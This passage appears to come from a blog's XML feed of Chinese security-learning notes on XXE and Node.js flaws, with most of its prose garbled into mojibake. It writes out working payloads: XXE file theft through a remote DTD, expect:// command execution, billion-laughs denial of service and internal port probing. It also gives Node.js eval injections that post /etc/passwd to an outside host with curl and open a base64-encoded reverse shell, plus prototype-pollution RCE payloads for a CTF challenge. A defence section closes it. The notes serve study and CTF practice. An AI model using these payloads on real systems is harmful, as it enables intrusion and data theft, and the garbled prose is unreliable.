æˆ<code>&amp;#x25</code></p><p>æˆ‘ä»¬ç›´æ¥æŠŠè¿™ä¸ªæ–‡ä»¶æ”¾åˆ°ä¸€ä¸ªç½‘ç«™ä¸Šï¼Œæˆ‘è¿™é‡Œå°±ç›´æ¥åˆ©ç”¨å®å¡”å’¯(æˆ‘æ˜¯æ‡’ç‹—)</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422021836512.png" alt="image-20220422021836512"></p><p>ç„¶åå‘æˆ‘ä»¬æœ¬åœ°çš„é¶æœºå‘é€payload</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422021925811.png" alt="image-20220422021925811"></p><p>æˆåŠŸå›æ˜¾å‡ºäº†æ–‡ä»¶</p><p><em>æ— å›æ˜¾æ”»å‡»æµç¨‹ï¼š</em></p><ul><li>å…ˆè°ƒç”¨<code>%dtd</code>ï¼Œè¯·æ±‚è¿œç¨‹æœåŠ¡å™¨(æ”»å‡»æœåŠ¡å™¨)ä¸Šçš„<code>evil.dtd</code>ã€‚</li><li>å†è°ƒç”¨ <code>evil.dtd</code>ä¸­çš„ <code>%file</code>ã€‚<code>%file</code> è·å–å—æ”»å‡»çš„æœåŠ¡å™¨ä¸Šé¢çš„æ•æ„Ÿæ–‡ä»¶ï¼Œç„¶åå°† <code>%file</code> çš„è¿”å›ç»“æœä¼ åˆ°<code>%send</code> ã€‚</li><li>ç„¶åè°ƒç”¨ <code>%send;</code> æŠŠè¯»å–åˆ°çš„æ•°æ®å‘é€åˆ°è¿œç¨‹æœåŠ¡å™¨ä¸Šã€‚</li></ul><p>è¿™æ ·å°±å®ç°äº†å¤–å¸¦æ•°æ®çš„æ•ˆæœï¼Œè§£å†³ XXE æ— å›æ˜¾çš„é—®é¢˜ã€‚</p><h2 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a><strong>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</strong></h2><p>åœ¨å®‰è£…expectæ‰©å±•çš„PHPç¯å¢ƒé‡Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå…¶ä»–åè®®ä¹Ÿæœ‰å¯èƒ½å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><p>é€šè¿‡XXEå¯ä»¥å®ç°RCEçš„å®ä¾‹å¾ˆå°‘ã€‚</p><h2 id="æ‹’ç»æœåŠ¡æ”»å‡»-DDOS"><a href="#æ‹’ç»æœåŠ¡æ”»å‡»-DDOS" class="headerlink" title="æ‹’ç»æœåŠ¡æ”»å‡»(DDOS)"></a><strong>æ‹’ç»æœåŠ¡æ”»å‡»(DDOS)</strong></h2><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;   &lt;!DOCTYPE lolz [&lt;!ENTITY lol &quot;lol&quot;&gt;&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</code></pre><p><strong>åŸç†</strong>ï¼šé€’å½’å¼•ç”¨,lol å®ä½“å…·ä½“è¿˜æœ‰ â€œlolâ€ å­—ç¬¦ä¸²ï¼Œç„¶åä¸€ä¸ª lol2 å®ä½“å¼•ç”¨äº† 10 æ¬¡ lol  å®ä½“ï¼Œä¸€ä¸ª lol3 å®ä½“å¼•ç”¨äº† 10 æ¬¡ lol2 å®ä½“ï¼Œæ­¤æ—¶ä¸€ä¸ª lol3 å®ä½“å°±å«æœ‰ 10^2 ä¸ª â€œlolâ€ äº†ï¼Œä»¥æ­¤ç±»æ¨ï¼Œlol9  å®ä½“å«æœ‰ 10^8 ä¸ª â€œlolâ€ å­—ç¬¦ä¸²,æœ€åå†å¼•ç”¨lol9ã€‚</p><h2 id="æ¢æµ‹å†…ç½‘ç«¯å£ä¸æ¢æµ‹å†…ç½‘ç½‘ç«™"><a href="#æ¢æµ‹å†…ç½‘ç«¯å£ä¸æ¢æµ‹å†…ç½‘ç½‘ç«™" class="headerlink" title="æ¢æµ‹å†…ç½‘ç«¯å£ä¸æ¢æµ‹å†…ç½‘ç½‘ç«™"></a><strong>æ¢æµ‹å†…ç½‘ç«¯å£ä¸æ¢æµ‹å†…ç½‘ç½‘ç«™</strong></h2><p>è¿™ä¸ªæˆ‘æ²¡å¤ç°æˆåŠŸã€‚ã€‚ã€‚å…ˆæ‹¿åˆ«äººçš„å§</p><p>æ¼æ´ä»£ç :</p><p>test.php</p><pre><code class="php">&lt;?php$xml = simplexml_load_string($_REQUEST[&#39;xml&#39;]);print_r($xml);//æ³¨é‡Šæ‰è¯¥è¯­å¥å³ä¸ºæ— å›æ˜¾çš„æƒ…å†µ?&gt;</code></pre><p>æ¢æµ‹å†…ç½‘ç«¯å£</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><p>3306ç«¯å£å¼€æ”¾<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20191202152107-4ea0fe60-14d4-1.jpg"><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202152107-4ea0fe60-14d4-1.jpg" alt="img"></a><br> 3389ç«¯å£æœªå¼€æ”¾<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20191202152125-5979dc4e-14d4-1.jpg"><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202152125-5979dc4e-14d4-1.jpg" alt="img"></a></p><h2 id="æ”»å‡»å†…ç½‘ç½‘ç«™"><a href="#æ”»å‡»å†…ç½‘ç½‘ç«™" class="headerlink" title="æ”»å‡»å†…ç½‘ç½‘ç«™"></a><strong>æ”»å‡»å†…ç½‘ç½‘ç«™</strong></h2><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80/payload&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><h2 id="XXEæ¼æ´é˜²å¾¡"><a href="#XXEæ¼æ´é˜²å¾¡" class="headerlink" title="XXEæ¼æ´é˜²å¾¡"></a><strong>XXEæ¼æ´é˜²å¾¡</strong></h2><p><strong>1ã€ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•</strong><br> php:</p><pre><code class="php">libxml_disable_entity_loader(true);</code></pre><p>java:</p><pre><code class="java">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</code></pre><p>Python:</p><pre><code class="python">from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre><p><strong>2ã€è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®</strong><br> è¿‡æ»¤å…³é”®å­—ï¼š<code>&lt;\!DOCTYPE</code>å’Œ<code>&lt;\!ENTITY</code>ï¼Œæˆ–è€…<code>SYSTEM</code>å’Œ<code>PUBLIC</code>ã€‚<br> <strong>3ã€ä¸å…è®¸XMLä¸­å«æœ‰è‡ªå·±å®šä¹‰çš„DTD</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> å¸¸è§æ¼æ´å’Œæ‰‹æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>node.jså¸¸è§æ¼æ´å­¦ä¹ </title>
      <link href="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="å±é™©å‡½æ•°æ‰€å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œ"><a href="#å±é™©å‡½æ•°æ‰€å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å±é™©å‡½æ•°æ‰€å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œ"></a>å±é™©å‡½æ•°æ‰€å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œ</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><p>eval() å‡½æ•°å¯è®¡ç®—æŸä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶æ‰§è¡Œå…¶ä¸­çš„çš„ JavaScript ä»£ç ã€‚å’ŒPHPä¸­evalå‡½æ•°ä¸€æ ·ï¼Œå¦‚æœä¼ é€’åˆ°å‡½æ•°ä¸­çš„å‚æ•°å¯æ§å¹¶ä¸”æ²¡æœ‰ç»è¿‡ä¸¥æ ¼çš„è¿‡æ»¤æ—¶ï¼Œå°±ä¼šå¯¼è‡´æ¼æ´çš„å‡ºç°ã€‚</p><p>ç®€å•ä¾‹å­:</p><pre><code class="javascript">var express = require(&quot;express&quot;);var app = express();app.get(&#39;/eval&#39;,function(req,res)&#123;res.send(eval(req.query.q));console.log(req.query.q);&#125;)var server = app.listen(8888, function() &#123;console.log(&quot;åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://127.0.0.1:8888/&quot;);&#125;)</code></pre><p><strong>æ¼æ´åˆ©ç”¨</strong></p><p>node.js.jsä¸­çš„chile_process.execè°ƒç”¨çš„æ˜¯/bash.shï¼Œå®ƒæ˜¯ä¸€ä¸ªbashè§£é‡Šå™¨ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚åœ¨evalå‡½æ•°çš„å‚æ•°ä¸­å¯ä»¥æ„é€ <code>require(&#39;child_process&#39;).exec(&#39;&#39;);</code>æ¥è¿›è¡Œè°ƒç”¨ã€‚</p><p>å¼¹è®¡ç®—å™¨(windows):</p><pre><code class="javascript">/eval?q=require(&#39;child_process&#39;).exec(&#39;calc&#39;);</code></pre><p>è¯»å–æ–‡ä»¶(linux)ï¼š</p><pre><code class="javascript">/eval?q=require(&#39;child_process&#39;).exec(&#39;curl -F &quot;x=`cat /etc/passwd`&quot; http://vps&#39;);;</code></pre><p>åå¼¹shell(linux)ï¼š</p><pre><code class="javascript">/eval?q=require(&#39;child_process&#39;).exec(&#39;echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx|base64 -d|bash&#39;);# mFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYxæ˜¯bash -i &gt;&amp; /dev/tcp/127.0.0.1/3333 0&gt;&amp;1 BASE64åŠ å¯†åçš„ç»“æœï¼Œç›´æ¥è°ƒç”¨ä¼šæŠ¥é”™ã€‚æ³¨æ„ï¼šBASE64åŠ å¯†åçš„å­—ç¬¦ä¸­æœ‰ä¸€ä¸ª+å·éœ€è¦urlç¼–ç ä¸º%2B(ä¸€å®šæƒ…å†µä¸‹)å¦‚æœä¸Šä¸‹æ–‡ä¸­æ²¡æœ‰require,åˆ™å¯ä»¥ä½¿ç”¨global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)æ¥æ‰§è¡Œå‘½ä»¤</code></pre><h2 id="ç±»ä¼¼å‘½ä»¤"><a href="#ç±»ä¼¼å‘½ä»¤" class="headerlink" title="ç±»ä¼¼å‘½ä»¤"></a>ç±»ä¼¼å‘½ä»¤</h2><ol><li><p>é—´éš”ä¸¤ç§’æ‰§è¡Œå‡½æ•°</p><pre><code>setInteval(some_function, 2000)</code></pre></li><li><p>ä¸¤ç§’åæ‰§è¡Œå‡½æ•°ï¼š</p><pre><code>setTimeout(some_function, 2000);</code></pre></li><li><p>some_functionå¤„å°±ç±»ä¼¼äºevalå‡½æ•°çš„å‚æ•°</p><pre><code>è¾“å‡ºHelloWorldï¼š    Function(â€œconsole.log(â€˜HelloWolrdâ€™)â€)()ç±»ä¼¼äºphpä¸­çš„create_function</code></pre></li></ol><h1 id="Node-js-åŸå‹æ±¡æŸ“æ¼æ´"><a href="#Node-js-åŸå‹æ±¡æŸ“æ¼æ´" class="headerlink" title="Node.js åŸå‹æ±¡æŸ“æ¼æ´"></a>Node.js åŸå‹æ±¡æŸ“æ¼æ´</h1><h2 id="å…³äºåŸå‹é“¾"><a href="#å…³äºåŸå‹é“¾" class="headerlink" title="å…³äºåŸå‹é“¾"></a>å…³äºåŸå‹é“¾</h2><p>JavascriptåŸå‹é“¾å‚è€ƒæ–‡ç« ï¼š<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">ç»§æ‰¿ä¸åŸå‹é“¾</a></p><p>æ–‡ç« å†…å…³äºåŸå‹å’ŒåŸå‹é“¾çš„çŸ¥è¯†å†™çš„éå¸¸è¯¦ç»†ï¼Œå°±ä¸å†æ€»ç»“æ•´ä¸ªè¿‡ç¨‹äº†ï¼Œä»¥ä¸‹ä¸ºå‡ ä¸ªæ¯”è¾ƒé‡è¦çš„ç‚¹ï¼š</p><p>1.åœ¨javascriptï¼Œæ¯ä¸€ä¸ªå®ä¾‹å¯¹è±¡éƒ½æœ‰ä¸€ä¸ªprototypeå±æ€§ï¼Œprototype å±æ€§å¯ä»¥å‘å¯¹è±¡æ·»åŠ å±æ€§å’Œæ–¹æ³•ã€‚</p><pre><code>object.prototype.name=value</code></pre><p>2.åœ¨javascriptï¼Œæ¯ä¸€ä¸ªå®ä¾‹å¯¹è±¡éƒ½æœ‰ä¸€ä¸ª<code>__proto__</code>å±æ€§ï¼Œè¿™ä¸ªå®ä¾‹å±æ€§æŒ‡å‘å¯¹è±¡çš„åŸå‹å¯¹è±¡(å³åŸå‹)ã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è®¿é—®å¾—åˆ°æŸä¸€å®ä¾‹å¯¹è±¡çš„åŸå‹å¯¹è±¡ï¼š</p><pre><code>objectname[&quot;__proto__&quot;]objectname.__proto__objectname.constructor.prototype</code></pre><p>3.ä¸åŒå¯¹è±¡æ‰€ç”Ÿæˆçš„åŸå‹é“¾å¦‚ä¸‹(éƒ¨åˆ†)ï¼š</p><pre><code>var o = &#123;a: 1&#125;;// oå¯¹è±¡ç›´æ¥ç»§æ‰¿äº†Object.prototype// åŸå‹é“¾ï¼š// o ---&gt; Object.prototype ---&gt; nullvar a = [&quot;yo&quot;, &quot;whadup&quot;, &quot;?&quot;];// æ•°ç»„éƒ½ç»§æ‰¿äº Array.prototype// åŸå‹é“¾ï¼š// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; nullfunction f()&#123;return 2;&#125;// å‡½æ•°éƒ½ç»§æ‰¿äº Function.prototype// åŸå‹é“¾ï¼š// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</code></pre><h2 id="åŸå‹é“¾æ±¡æŸ“åŸç†"><a href="#åŸå‹é“¾æ±¡æŸ“åŸç†" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“åŸç†"></a>åŸå‹é“¾æ±¡æŸ“åŸç†</h2><p>å¯¹äºè¯­å¥ï¼š<code>object[a][b] = value</code> å¦‚æœå¯ä»¥æ§åˆ¶aã€bã€valueçš„å€¼ï¼Œå°†aè®¾ç½®ä¸º<code>__proto__</code>ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç»™objectå¯¹è±¡çš„åŸå‹è®¾ç½®ä¸€ä¸ªbå±æ€§ï¼Œå€¼ä¸ºvalueã€‚è¿™æ ·æ‰€æœ‰ç»§æ‰¿objectå¯¹è±¡åŸå‹çš„å®ä¾‹å¯¹è±¡åœ¨æœ¬èº«ä¸æ‹¥æœ‰bå±æ€§çš„æƒ…å†µä¸‹ï¼Œéƒ½ä¼šæ‹¥æœ‰bå±æ€§ï¼Œä¸”å€¼ä¸ºvalueã€‚</p><p>æ¥çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­:</p><pre><code>object1 = &#123;&quot;a&quot;:1, &quot;b&quot;:2&#125;;object1.__proto__.foo = &quot;Hello World&quot;;console.log(object1.foo);object2 = &#123;&quot;c&quot;:1, &quot;d&quot;:2&#125;;console.log(object2.foo);</code></pre><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220416000347433.png" alt="image-20220416000347433"></p><p>æœ€ç»ˆè¾“å‡ºäº†ä¸¤ä¸ªhello word</p><p>ä¸ºä»€ä¹ˆobject2åœ¨æ²¡æœ‰è®¾ç½®fooå±æ€§çš„æƒ…å†µä¸‹ï¼Œä¹Ÿä¼šè¾“å‡ºHello  Worldå‘¢ï¼Ÿå°±æ˜¯å› ä¸ºåœ¨ç¬¬äºŒæ¡è¯­å¥ä¸­ï¼Œæˆ‘ä»¬å¯¹object1çš„åŸå‹å¯¹è±¡è®¾ç½®äº†ä¸€ä¸ªfooå±æ€§ï¼Œè€Œobject2å’Œobject1ä¸€æ ·ï¼Œéƒ½æ˜¯ç»§æ‰¿äº†Object.prototypeã€‚åœ¨è·å–object2.fooæ—¶ï¼Œç”±äºobject2æœ¬èº«ä¸å­˜åœ¨fooå±æ€§ï¼Œå°±ä¼šå¾€çˆ¶ç±»Object.prototypeä¸­å»å¯»æ‰¾ã€‚è¿™å°±é€ æˆäº†ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œæ‰€ä»¥åŸå‹é“¾æ±¡æŸ“ç®€å•æ¥è¯´å°±æ˜¯å¦‚æœèƒ½å¤Ÿæ§åˆ¶å¹¶ä¿®æ”¹ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œå°±å¯ä»¥å½±å“åˆ°æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡åŒä¸€ä¸ªåŸå‹çš„å¯¹è±¡ã€‚</p><h2 id="mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“"><a href="#mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“"></a>mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“</h2><p>mergeæ“ä½œæ˜¯æœ€å¸¸è§å¯èƒ½æ§åˆ¶é”®åçš„æ“ä½œï¼Œä¹Ÿæœ€èƒ½è¢«åŸå‹é“¾æ”»å‡»ã€‚</p><p>ä¾‹å­:</p><pre><code class="javascript">function merge(target, source) &#123;for (let key in source) &#123;if (key in source &amp;&amp; key in target) &#123;merge(target[key], source[key])&#125; else &#123;target[key] = source[key]&#125;&#125;&#125;let object1 = &#123;&#125;let object2 = JSON.parse(&#39;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#39;)merge(object1, object2)console.log(object1.a, object1.b)object3 = &#123;&#125;console.log(object3.b)# merge() å‡½æ•°ç”¨äºåˆå¹¶ä¸¤ä¸ªæ•°ç»„å†…å®¹åˆ°ç¬¬ä¸€ä¸ªæ•°ç»„ã€‚åœ¨æœ¬æ®µä»£ç çš„ä½œç”¨å°±æ˜¯å°†å¾…æ“ä½œçš„å¯¹è±¡mergeåˆ°ä¸€ä¸ªç©ºå¯¹è±¡ä¸­</code></pre><p>éœ€è¦æ³¨æ„çš„ç‚¹æ˜¯ï¼š</p><p>åœ¨JSONè§£æçš„æƒ…å†µä¸‹ï¼Œ<code>__proto__</code>ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªçœŸæ­£çš„â€œé”®åâ€ï¼Œè€Œä¸ä»£è¡¨â€œåŸå‹â€ï¼Œæ‰€ä»¥åœ¨éå†object2çš„æ—¶å€™ä¼šå­˜åœ¨è¿™ä¸ªé”®ã€‚</p><p>æˆ‘ä»¬æ¥çœ‹ä¸‹ï¼Œæœ‰å’Œæ²¡æœ‰JSONè§£æçš„åŒºåˆ«</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220416001143881.png" alt="image-20220416001143881"></p><p>æ‰€ä»¥ä»£ç åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šå­˜åœ¨è¿™ä¹ˆä¸€æ­¥</p><pre><code class="javascript">target[__proto__]=source[__proto__]å¯ç†è§£ä¸º  object.prototype = &#123;&quot;b&quot;: 2&#125; å¯¼è‡´äº†åŸå‹é“¾æ±¡æŸ“</code></pre><p>æœ€ç»ˆè¾“å‡ºçš„ç»“æœä¸ºï¼š</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220416000830058.png" alt="image-20220416000830058"></p><p>å¯è§object3çš„bæ˜¯ä»åŸå‹ä¸­è·å–åˆ°çš„ï¼Œè¯´æ˜Objectå·²ç»è¢«æ±¡æŸ“äº†ã€‚</p><h2 id="Code-Breaking-2018-Thejs"><a href="#Code-Breaking-2018-Thejs" class="headerlink" title="Code-Breaking 2018 Thejs"></a>Code-Breaking 2018 Thejs</h2><p>é¢˜ç›®æºç ä¸‹è½½ï¼š<a href="http://code-breaking.com/puzzle/9/">http://code-breaking.com/puzzle/9/</a></p><p>server.js</p><pre><code class="javascript">const fs = require(&#39;fs&#39;)const express = require(&#39;express&#39;)const bodyParser = require(&#39;body-parser&#39;)const lodash = require(&#39;lodash&#39;)const session = require(&#39;express-session&#39;)const randomize = require(&#39;randomatic&#39;)const app = express()app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use(&#39;/static&#39;, express.static(&#39;static&#39;))app.use(session(&#123;    name: &#39;thejs.session&#39;,    secret: randomize(&#39;aA0&#39;, 16),    resave: false,    saveUninitialized: false&#125;))app.engine(&#39;ejs&#39;, function (filePath, options, callback) &#123; // define the template engine    fs.readFile(filePath, (err, content) =&gt; &#123;        if (err) return callback(new Error(err))        let compiled = lodash.template(content)        let rendered = compiled(&#123;...options&#125;)        return callback(null, rendered)    &#125;)&#125;)app.set(&#39;views&#39;, &#39;./views&#39;)app.set(&#39;view engine&#39;, &#39;ejs&#39;)app.all(&#39;/&#39;, (req, res) =&gt; &#123;    let data = req.session.data || &#123;language: [], category: []&#125;    if (req.method == &#39;POST&#39;) &#123;        data = lodash.merge(data, req.body)        req.session.data = data    &#125;        res.render(&#39;index&#39;, &#123;        language: data.language,         category: data.category    &#125;)&#125;)app.listen(3000, () =&gt; console.log(`Example app listening on port 3000!`))</code></pre><p>é—®é¢˜å‡ºåœ¨lodash.merge()å‡½æ•°,è¿™ä¸ªå‡½æ•°å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚æˆ‘ä»¬å¾—å¯»æ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„ç‚¹ã€‚å› ä¸ºé€šè¿‡æ¼æ´å¯ä»¥æ§åˆ¶æŸä¸€ç§å®ä¾‹å¯¹è±¡åŸå‹çš„å±æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å»å¯»æ‰¾ä¸€ä¸ªå¯ä»¥è¢«åˆ©ç”¨çš„å±æ€§ã€‚</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220416004841823.png" alt="image-20220416004841823"></p><p>é¡µé¢æœ€ç»ˆä¼šé€šè¿‡lodash.templateè¿›è¡Œæ¸²æŸ“</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220416005502144.png" alt="image-20220416005502144"></p><p>è·Ÿè¸ªåˆ°lodash/template.jsä¸­</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/QyN5JVOde3YL8aZ.png" alt="template_js.png"></p><p>å¦‚å›¾å¯ä»¥çœ‹åˆ°optionsæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ŒsourceURLæ˜¯é€šè¿‡ä¸‹é¢çš„è¯­å¥èµ‹å€¼çš„ï¼Œoptionsé»˜è®¤æ²¡æœ‰sourceURLå±æ€§ï¼Œæ‰€ä»¥sourceURLé»˜è®¤ä¹Ÿæ˜¯ä¸ºç©ºã€‚å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿç»™optionsçš„åŸå‹å¯¹è±¡åŠ ä¸€ä¸ªsourceURLå±æ€§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶sourceURLçš„å€¼ã€‚</p><p>ç»§ç»­å¾€ä¸‹é¢çœ‹ï¼Œæœ€åsourceURLä¼ é€’åˆ°äº†Functionå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å½“ä¸­ï¼š</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/pwoVFrOyfzJX42M.png" alt="template_js01.png"></p><p>é€šè¿‡æ„é€ chile_process.exec()å°±å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç äº†ã€‚</p><p>æœ€ç»ˆå¯ä»¥æ„é€ ä¸€ä¸ªç®€å•çš„Payloadä½œä¸ºä¼ é€’ç»™ä¸»é¡µé¢çš„çš„POSTæ•°æ®(windowsè°ƒç”¨è®¡ç®—å™¨)ï¼š</p><pre><code>&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nglobal.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)//&quot;&#125;&#125;</code></pre><p>(è¿™é‡Œç›´æ¥ç”¨requireä¼šæŠ¥é”™ï¼šReferenceError: require is not defined</p><p>pç¥ç»™äº†ä¸€ä¸ªæ›´å¥½çš„payloadï¼š</p><pre><code>&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nreturn e=&gt; &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;id&#39;)&#125;\n//&quot;&#125;&#125;</code></pre><h1 id="node-serializeååºåˆ—åŒ–RCEæ¼æ´-CVE-2017-5941"><a href="#node-serializeååºåˆ—åŒ–RCEæ¼æ´-CVE-2017-5941" class="headerlink" title="node-serializeååºåˆ—åŒ–RCEæ¼æ´(CVE-2017-5941)"></a>node-serializeååºåˆ—åŒ–RCEæ¼æ´(CVE-2017-5941)</h1><p>æ¼æ´å‡ºç°åœ¨node-serializeæ¨¡å—0.0.4ç‰ˆæœ¬å½“ä¸­ï¼Œä½¿ç”¨<code>npm install 